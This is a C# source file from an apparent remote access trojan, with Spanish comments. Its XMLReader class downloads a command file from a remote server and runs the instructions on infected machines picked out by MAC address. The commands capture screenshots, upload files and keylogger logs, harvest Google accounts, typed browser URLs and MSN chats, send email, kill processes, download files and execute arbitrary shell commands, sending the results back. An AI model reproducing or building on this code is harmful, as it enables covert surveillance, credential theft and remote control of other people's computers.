using System;
using System.Xml;

namespace flu
{
    class XMLReader
    {
        private XmlDocument xDoc = null;
        private int version = 0;

        /// <summary>
        /// Crea el archivo XML
        /// </summary>
        public XMLReader()
        {
            xDoc = new XmlDocument();
        }

        /// <summary>
        /// Descargar el XML actualizado con las instrucciones
        /// </summary>
        public void GetXML()
        {
            try { xDoc.Load(Network.XML); } // Leer XML remoto
            catch { System.Console.WriteLine("No hay servidor web en el otro lado"); }
        }

        /// <summary>
        /// Ejecuta las instrucciones recogidas en el XML
        /// </summary>
        public void ExecuteXML()
        {
            XmlNode nodes = xDoc.DocumentElement;
            foreach (XmlNode node in nodes)
            {
                //Si la versión del documento es nueva, es decir hay nuevos comandos, ejecutamos
                if (node.Name.Equals("version"))
                {
                    int number = Convert.ToInt32(node.Attributes[0].Value);

                    if (number <= version) 
                    { 
                        System.Console.WriteLine("version no superada"); 
                    }
                    else
                    {
                        version = number;
                        XmlNodeList commands = xDoc.GetElementsByTagName("instruction");
                        //Leemos todas las instrucciones del documento XML
                        foreach (XmlNode command in commands)
                        {
                            try {
                                //Si es un comando para todas las máquinas, o esta es la máquina a la que se le envia
                                if ((command.Attributes[3].Value.Contains(Network.MAC)) || (command.Attributes[3].Value.Equals("all")))
                                {
                                    switch (command.Attributes[0].Value.ToUpper())
                                    {
                                        case "WALLPAPER":
                                            string fondo = Network.DownloadFile(command.Attributes[1].Value);
                                            OS.ChangeWallpaper(fondo);
                                        break;
                                        case "SNAPSHOT":
                                            Network.SendImage();
                                        break;
                                        case "GETFILE":
                                            Network.SendFile(command.Attributes[1].Value, command.Attributes[0].Value, command.Attributes[2].Value);
                                        break;
                                        case "GETKEYLOGGER":
                                            Network.SendFile(OS.getKeyValue("win32").Replace(".exe",".txt"), command.Attributes[0].Value, command.Attributes[2].Value);
                                        break;
                                        case "SENDMAIL":
                                            string[] argumentos = command.Attributes[1].Value.ToString().Split('|');
                                            Mail email = new Mail(argumentos[2], argumentos[0], argumentos[1], argumentos[4],
                                                                  argumentos[3], argumentos[5], argumentos[6]);
                                            email.sendMail(Int32.Parse(argumentos[7]));
                                        break;
                                        case "KILLPROCESS":
                                            OS.KillProcess(command.Attributes[1].Value);
                                        break;
                                        case "PLAYAUDIO":
                                            OS.PlayAudio(command.Attributes[1].Value);
                                        break;
                                        case "DOWNLOADFILE":
                                            Network.DownloadFile(command.Attributes[1].Value);
                                        break;
                                        case "GETREGISTERS":
                                            string salida = string.Empty;
                                            try{foreach (string a in OS.getGoogleAccount()) salida += a + "<br/>";}catch { }
                                            finally { salida += "<br/>"; }
                                            try{foreach (string a in OS.getMoviesMade()) salida += a + "<br/>";}catch { }
                                            finally { salida += "<br/>"; }
                                            try{foreach (string a in OS.getInternetExplorerTypedUrls()) salida += a + "<br/>";}catch { }
                                            finally { salida += "<br/>"; }
                                            try{foreach (string a in OS.getBlogs()) salida += a + "<br/>";}catch { }
                                            finally { salida += "<br/>"; }
                                            try{foreach (string a in OS.getMsnTalks())salida += a + "<br/>";}catch { }
                                            finally { salida += "<br/>"; }
                                            Network.SendInformation(salida, command.Attributes[0].Value.ToString(), command.Attributes[2].Value.ToString(), 1);
                                        break;
                                        // Para agregar comandos extra añadir un bloque del tipo:
                                        // case "COMANDO":
                                        //      comandos a ejecutar
                                        // break;
                                        default:
                                            Console.ExecuteAndSend(command.Attributes[0].Value, command.Attributes[1].Value, command.Attributes[2].Value);
                                        break;
                                    }
                                }
                            } catch { }
                        }
                    }
                }

            }
        }
    }
}
